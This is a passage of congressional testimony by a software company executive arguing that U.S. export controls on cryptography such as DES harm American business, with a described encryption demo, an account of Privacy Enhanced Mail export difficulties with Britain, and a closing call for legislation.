conclusively that U.S. business is ata severe disadvantage in attempting to sell products to the worldmarket. If our competitors overseas can routinely ship to mostplaces in the world within days and we must go though timeconsuming and onerous procedures with the most likely outcomebeing denial of the export request, we might as well not eventry. And that is exactly what many U.S. companies have decided. And please be certain to understand that we are not talking abouta few isolated products involving encryption. More and more weare talking about major information processing applications likedatabases, electronic mail packages, and integrated softwaresystems that must use cryptography to provide even the most basiclevel of security being demanded by multinational companies. AT&T Products We also have a collection of products manufactured by or for AT&Tfor sale in the U.S. and in some cases overseas. These includetelephone security devices, facsimile security devices, and datacommunications devices. Some of these devices are intended to bemade with the Administration's Clipper Chip whenever it becomesavailable, but all of them are available NOW with either DES orproprietary encryption algorithms. Some of these devices aremanufactured in Switzerland. They can be imported into the U.S.for sale, but they cannot be exported elsewhere. Indeed, if theybreak they cannot be returned to the manufacturer for repair. Demo We now have a brief demonstration of just how availablecryptography is and how easily it can be applied to protectsensitive information anywhere in the world. We have here two commercially available computer workstationsrunning commercially available software and connected by aconventional network (or dialup line). They are communicatingaudio information (in this case from a tape recorder) much as isdone daily by voice conferences on the Internet. The delay youhear is being emphasized for purposes of the demonstration.Everything being shown here is commercially available todaythroughout the world. [ADD FIRST CRYPTO TO BOTH SYSTEMS] We can now add a software version of DES from Australia to boththe sender and receiver stations to add good quality encryptionto the communications. [PUT INCORRECT KEY IN RECEIVING WORKSTATION] Now if Dave wanted to keep Pete from listening in to his music,he could change the key used for the encryption and demonstratewhat an interceptor might hear. Next we reset the key so we can communicate again. [USE SECOND DES VERSION ON BOTH WORKSTATIONS] Now we can demonstrate this using a Swedish DES implementation.There is no difference in the result. There is no rocket science involved here. Anyone with anelementary knowledge of modern computer workstations can do whatwe have done. All of the software is available essentiallyanywhere in the world. We must not kid ourselves about thisbeing difficult or unavailable! PEM Experiences My written testimony lists many of the experiences of U.S.companies that the SPA has collected. I would like to discussbriefly my company's experiences with one of our products,Privacy Enhanced Mail. PEM is a software product that works withelectronic mail systems to add encryption services for secrecyand authentication. PEM is capable of using a wide variety ofencryption algorithms but in its Internet version uses DES andtherefore cannot be exported except to Canada. We have been discussing PEM with the British government forseveral years. We have a product that could have already been inwide use there, satisfying their unclassified electronic mailprotection needs, except that we cannot export it to them. Whenthe SPA successfully negotiated an agreement with NSA last yearallowing the export of encryption products with short key lengths(40 bits or less), we approached the British with an exportableversion of PEM. Since DES (with its 56-bit key length, 65,000times stronger than our 40-bit exportable version) is alreadywidely available in the UK, the British politely informed us thatthey did not want to consider such a weak product. To attempt to satisfy our British customers, we have recentlyhired British scientists to implement an independent version ofPEM using the published international specifications and UKversions of DES. The impact on TIS involves the cost ofreimplementing something we already have, plus the loss to theU.S. of sales of approx 10,000 systems, roughly $2.5 million overseveral years. This represents a revenue impact to my company ofbetween 15 and 25% of our total revenue in any given year. But the ironic part of this is that because of the apparentdifferences between the UK export laws and those imposed by theU.S., we may be able to import the UK PEM implementation for salein the U.S. and thus eliminate the need for our U.S. PEMoperation all together. Unfortunately, these experiences are not unique to my company.Similar and all too often worse stories abound throughout theU.S. Why? And why is all this happening? U.S. law enforcement and nationalsecurity interests are trying to retain the ability to interceptthe communications of our adversaries in the face of acceleratingtechnology shifts that will make it ever easier for those whowish to protect their communications to do so. I do not wish to deny the Government the right, indeed theresponsibility, to try as hard as they can to maintain thatability. But we must recognize the total magnitude of thisproblem. We must find a way to balance the costs to the citizensof the United States of losing its vital industrial secrets toforeign espionage and its dominant position in the informationprocessing industry to foreign competition versus the inevitablereduction of our interception capabilities, when foreignavailability of cryptography is already so great. Calls for Action The National Research Council has warned of this problem in fourrecent reports (see Attachment 3 of my testimony). The ComputerSystem Security and Privacy Advisory Board has called for anational review of this dilemma for nearly two years (seeAttachment 4 of my Testimony). The President said, on September16, that "...we cannot repeal the force that is driving the worldeconomy together. We can run away from it and get beat by it, orwe can embrace it, do what we have to do and win with it." On September 30, the President announced a dramatic relaxation ofthe export controls on all types of high performance computerproducts. Is it not time to look at the exports of cryptographicproducts, too? If we don't, the National InformationInfrastructure will very likely get its security protection fromforeign sources. We need to recognize that the U.S. public has a right to areasonable level of protection for its sensitive information.Enabling that right through allowing the export of good qualitycryptography such as DES will not harm the intelligence gatheringcapabilities of this country any more than the worldwideproliferation of cryptography already has. I strongly urge this Subcommittee to press vigorously forlegislation to allow the export of good quality cryptography sothat our computer industry will build it into their products andour citizens can use it to protect their vital sensitiveinformation.
